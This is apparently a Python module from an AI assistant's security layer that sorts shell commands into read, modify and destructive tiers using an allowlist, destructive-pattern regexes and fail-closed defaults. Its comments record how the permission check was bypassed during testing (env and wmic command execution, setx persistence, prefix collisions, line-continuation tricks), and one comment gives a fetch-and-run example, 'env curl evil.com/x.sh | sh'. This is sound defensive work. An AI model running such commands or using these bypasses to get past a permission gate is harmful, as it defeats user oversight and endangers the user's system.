"""Classifies a shell command string into a PermissionLevel + RiskLevel.

This is allowlist-first: a command is only ever treated as READ/SAFE if it
matches a known-safe prefix. Anything that doesn't match a known safe or
known modify pattern is classified DESTRUCTIVE by default (fail closed),
even if it isn't in the explicit destructive-pattern list. The explicit
destructive patterns exist to get the risk labeling and reasons right for
common cases, not to define the full boundary of "dangerous".
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field

from jarvis.security.deny_list import denied_command, normalize_command
from jarvis.security.permissions import PermissionLevel, Reversibility, RiskLevel


def _matches_prefix(lowered: str, prefix: str) -> bool:
    """A real word-boundary prefix match, not a bare startswith(). Found by
    testing: plain startswith() let a longer, unrelated, more dangerous
    command name slip through as though it were the short safe one it
    happens to start with -- "hostnamectl set-hostname evil" matched the
    "hostname" READ prefix, "setx MALICIOUS_VAR value" matched "set". Both
    are different binaries that merely share a text prefix, not the same
    command with more arguments. Requires an exact match or the character
    right after the prefix to be whitespace, so "env"/"envfoo" and
    "hostname"/"hostnamectl" are no longer conflated. Prefix entries that
    already end in a space (kept for readability, e.g. "md ") work the
    same either way since the trailing space is stripped before comparing.
    """
    prefix = prefix.rstrip()
    if not lowered.startswith(prefix):
        return False
    return len(lowered) == len(prefix) or lowered[len(prefix)].isspace()


@dataclass
class CommandClassification:
    category: PermissionLevel
    risk: RiskLevel
    reasons: list[str] = field(default_factory=list)
    denied: bool = False
    reversibility: Reversibility = Reversibility.UNKNOWN


# Read-only: informational commands with no filesystem/process/network side effects.
#
# "env" and "wmic" are deliberately NOT in this list even though a bare
# invocation of either is read-only -- see _read_prefix_disguises_execution
# below. Both are LOLBIN-class utilities that become a general
# command-execution primitive the instant they're given the right
# argument: "env whoami" / "env rm important_file" runs that program with
# a modified environment (confirmed: classified as READ and ALLOWed with
# zero confirmation before this was found by testing), and
# "wmic process call create X" spawns X as a new process via WMI, a
# well-known Windows LOLBIN technique. Handled as their own check instead
# of a blanket prefix match, which had no way to tell "env" (list vars)
# apart from "env curl evil.com/x.sh | sh" (run a script).
_READ_PREFIXES = (
    "git status", "git log", "git diff", "git branch", "git remote", "git show",
    "git rev-parse", "git describe", "git blame",
    "dir", "ls", "pwd", "cd", "type", "cat", "more", "find /i", "where", "which",
    "echo", "whoami", "hostname", "systeminfo", "ver", "python --version",
    "python -V", "python3 --version", "pip --version", "pip list", "pip show",
    "pip freeze", "node --version", "npm --version", "npm list", "npm ls",
    "docker --version", "docker ps", "docker images", "docker info",
    "java -version", "javac -version", "netstat", "tasklist", "get-process",
    "get-childitem", "get-content", "get-location", "set", "printenv",
    "df", "du -sh", "systemctl status", "service status",
    "wmic",  # bare/query form only -- "wmic ... call ..." is intercepted above
    "env",  # bare/flags-only form only -- "env COMMAND" is intercepted above
)

# systeminfo/tasklist accept /s /u /p (or -ComputerName/-Credential) to
# query a REMOTE machine using supplied credentials -- turning a local
# read-only inventory command into remote credential validation / lateral-
# movement recon, exactly the "remote-login attack automation" the
# "must not become an attack tool" spec section forbids. A bare local
# invocation of either is unaffected.
_REMOTE_TARGET_FLAG = re.compile(r"(?:^|\s)(/s\b|-computername\b|-credential\b)", re.IGNORECASE)


def _read_prefix_disguises_execution(lowered: str) -> str | None:
    """Returns a reason string if `lowered` only LOOKS like one of the
    read-only prefixes below but actually executes something / targets a
    remote host, else None. Checked before the ordinary prefix-match loop
    so these can never fall through to a READ classification via
    startswith() regardless of prefix-list order.
    """
    tokens = lowered.split()
    if not tokens:
        return None
    head = tokens[0]
    rest = tokens[1:]

    if head == "env":
        # A positional (non-flag) argument to `env` is the command it runs.
        if any(not tok.startswith("-") for tok in rest):
            return "'env' with a command argument executes that command; not a read-only environment listing."
        return None

    if head == "wmic" and re.search(r"\bcall\b", lowered):
        return "'wmic ... call ...' invokes a WMI method (can create/terminate a process); not a read-only query."

    if head in ("systeminfo", "tasklist", "netstat") and _REMOTE_TARGET_FLAG.search(lowered):
        return f"'{head}' with a remote-target flag queries another machine using supplied credentials; not a local read."

    return None

# Modify: changes state but is routine, project-scoped, and reversible in the
# ordinary sense (undo by reinstalling/re-cloning/deleting the new file).
_MODIFY_PREFIXES = (
    "pip install", "pip uninstall", "npm install", "npm uninstall", "npm ci",
    "npm run", "npm build", "yarn install", "yarn add",
    "python -m venv", "python3 -m venv", "virtualenv",
    "git add", "git commit", "git fetch", "git pull", "git checkout -b",
    "git switch -c", "git tag", "git stash",
    "mkdir", "md ", "new-item", "touch", "copy", "cp ", "xcopy", "move ", "mv ",
    "docker build", "docker run", "docker-compose up", "docker compose up",
)

# Destructive: explicit patterns worth naming precisely (for the reason
# string AND the reversibility shown to the user) even though the
# fail-closed default would catch most of these anyway as "unknown".
# Each entry is (pattern, reversibility) -- deliberately a judgment call
# made here by deterministic code, not left for the LLM to claim.
_DESTRUCTIVE_PATTERNS: tuple[tuple[re.Pattern, Reversibility], ...] = tuple(
    (re.compile(p, re.IGNORECASE), rev) for p, rev in (
        (r"\brm\s+-rf\b", Reversibility.IRREVERSIBLE),
        (r"\brm\s+-r\b", Reversibility.IRREVERSIBLE),
        (r"\bremove-item\b.*-recurse", Reversibility.IRREVERSIBLE),
        (r"\bdel\s+/s\b", Reversibility.IRREVERSIBLE),
        (r"\brd\s+/s\b", Reversibility.IRREVERSIBLE),
        (r"\brmdir\s+/s\b", Reversibility.IRREVERSIBLE),
        # No trailing \b: a word boundary can't match between ":" and a
        # following space/end-of-string/non-word char, so "format d: /q" or
        # bare "format d:" would never match with one -- found by testing.
        (r"\bformat\s+[a-z]:", Reversibility.IRREVERSIBLE),
        (r"\bdiskpart\b", Reversibility.IRREVERSIBLE),
        (r"\bshutdown\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\brestart-computer\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bgit\s+reset\s+--hard\b", Reversibility.IRREVERSIBLE),
        (r"\bgit\s+clean\s+-[a-z]*f", Reversibility.IRREVERSIBLE),
        (r"\bgit\s+push\s+.*--force\b", Reversibility.IRREVERSIBLE),
        (r"\bgit\s+push\s+.*-f\b", Reversibility.IRREVERSIBLE),
        (r"\bdrop\s+(table|database)\b", Reversibility.IRREVERSIBLE),
        (r"\btruncate\s+table\b", Reversibility.IRREVERSIBLE),
        (r"\btaskkill\b.*\/f\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bstop-process\b.*-force", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bnew-itemproperty\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bset-itemproperty\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bunset\s+.*path\b", Reversibility.PARTIALLY_REVERSIBLE),
        # Not just "setx path" -- setx persists ANY environment variable
        # across sessions, and several (PYTHONSTARTUP, NODE_OPTIONS,
        # BASH_ENV, PS1) make the OS run arbitrary code on every future
        # interpreter/shell start, a real persistence/code-injection
        # technique. Found by testing: scoping this pattern to "path" only
        # left "setx MALICIOUS_VAR value" and "setx PYTHONSTARTUP ..." to
        # fall through to the "set" READ prefix's startswith() match
        # ("setx ...".startswith("set") is True) and classify as READ,
        # auto-allowed with zero confirmation.
        (r"\bsetx\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bnpm\s+uninstall\s+-g\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bpip\s+uninstall\s+-y\s+--all\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"\bwmic\s+.*delete\b", Reversibility.IRREVERSIBLE),
        (r"\bicacls\b", Reversibility.PARTIALLY_REVERSIBLE),
        (r"^\s*:\(\)\s*\{.*\}\s*;\s*:", Reversibility.IRREVERSIBLE),  # fork bomb
    )
)

_SYSTEM_DIR_PATTERN = re.compile(
    r"c:\\windows\b|c:\\program files\b|/etc/|/bin/|/usr/bin", re.IGNORECASE
)


def classify_command(command: str, cwd: str | None = None) -> CommandClassification:
    stripped = command.strip()
    if not stripped:
        return CommandClassification(PermissionLevel.DENY, RiskLevel.CRITICAL, ["Empty command."], denied=True)

    # Collapse PowerShell (`) / cmd.exe (^) line continuations BEFORE any
    # pattern match runs, not just the deny-list one -- found by testing:
    # "net stop^\nwindefend" is one logical command to a real shell, but
    # \s+ in a pattern like \bnet\s+stop\s+windefend\b does not match across
    # a literal ^ character, so leaving it unnormalized here too would let
    # the same technique dodge the destructive-pattern/prefix logic below.
    stripped = normalize_command(stripped)

    deny_reason = denied_command(stripped)
    if deny_reason:
        return CommandClassification(PermissionLevel.DENY, RiskLevel.CRITICAL, [deny_reason], denied=True)

    lowered = stripped.lower()

    for pattern, reversibility in _DESTRUCTIVE_PATTERNS:
        if pattern.search(lowered):
            return CommandClassification(
                PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH,
                [f"Matches destructive pattern: {pattern.pattern}"],
                reversibility=reversibility,
            )

    if _SYSTEM_DIR_PATTERN.search(lowered) and not any(_matches_prefix(lowered, p) for p in ("dir", "ls", "type", "cat", "echo")):
        return CommandClassification(
            PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH,
            ["Command references a system directory."],
            reversibility=Reversibility.UNKNOWN,
        )

    # Chaining/piping/redirection operators (;, &&, |, `, $(...), >, >>, <,
    # newline) must be checked BEFORE prefix matching below. Otherwise a
    # command like "echo hi > ~/.bashrc", "dir & npm publish", or
    # "git status\nnpm publish" would match the READ prefix "echo"/"dir"/
    # "git status" via startswith() and never have its trailing, unverified
    # remainder looked at at all. Embedded newlines are just as much a
    # command separator to cmd.exe/sh -c as ";" is.
    if any(sep in stripped for sep in (";", "&&", "||", "|", "`", "$(", ">", "<", "&", "\n", "\r")):
        return CommandClassification(
            PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH,
            ["Command chains, pipes, or redirects multiple operations; not individually verifiable."],
            reversibility=Reversibility.UNKNOWN,
        )

    try:
        shlex.split(stripped)
    except ValueError:
        return CommandClassification(
            PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH,
            ["Command could not be safely parsed (unbalanced quoting)."],
            reversibility=Reversibility.UNKNOWN,
        )

    # Must run before the prefix loop for the same reason as the chain-
    # operator check above: startswith("env")/startswith("wmic") cannot
    # tell "env" (list vars) apart from "env whoami" (run whoami), or
    # "wmic os get caption" (query) apart from "wmic process call create
    # X" (spawn X) -- found by testing, confirmed via the real
    # PolicyEngine to ALLOW arbitrary command execution with zero
    # confirmation before this check existed.
    disguise_reason = _read_prefix_disguises_execution(lowered)
    if disguise_reason:
        return CommandClassification(
            PermissionLevel.DESTRUCTIVE, RiskLevel.HIGH, [disguise_reason],
            reversibility=Reversibility.UNKNOWN,
        )

    for prefix in _READ_PREFIXES:
        if _matches_prefix(lowered, prefix):
            return CommandClassification(PermissionLevel.READ, RiskLevel.LOW, [f"Matches read-only prefix '{prefix}'."], reversibility=Reversibility.REVERSIBLE)

    for prefix in _MODIFY_PREFIXES:
        if _matches_prefix(lowered, prefix):
            return CommandClassification(PermissionLevel.MODIFY, RiskLevel.MEDIUM, [f"Matches routine modify prefix '{prefix}'."], reversibility=Reversibility.REVERSIBLE)

    # Fail closed: unknown command shape, not on any allowlist.
    return CommandClassification(
        PermissionLevel.DESTRUCTIVE, RiskLevel.MEDIUM,
        ["Command does not match a known read-only or routine-modify pattern; treated as high-risk by default."],
        reversibility=Reversibility.UNKNOWN,
    )


def grant_scope_for_command(command: str) -> str:
    """The routine-action 'family' a command belongs to, for grant-key
    purposes -- i.e. what a SESSION/ALWAYS approval should be scoped to.
    Deliberately the exact granularity of _MODIFY_PREFIXES itself, since
    each entry there is already a curated routine-action family: "git add",
    "git commit", "git fetch", and "git stash" are different operations
    with different consequences even though they share "git" as their
    first token. Found by testing: the grant_key ExecuteCommandTool used
    to build from command.split()[0] alone collapsed ALL git subcommands
    (and all pip/npm subcommands) into one grant -- approving "git add
    file.py" once with SESSION scope silently covered "git fetch", "git
    stash", "git tag", and "git commit" afterward too, none of which the
    user ever saw. Falls back to the first whitespace token for a command
    that doesn't match any curated prefix; that fallback's coarseness has
    no bypass consequence since such a command is always DESTRUCTIVE/
    CONFIRM-every-time regardless of any grant (PolicyEngine._evaluate's
    own "no grant covers DESTRUCTIVE" rule).
    """
    lowered = command.strip().lower()
    for prefix in _MODIFY_PREFIXES:
        if _matches_prefix(lowered, prefix):
            return prefix.strip()
    tokens = command.split()
    return tokens[0] if tokens else ""
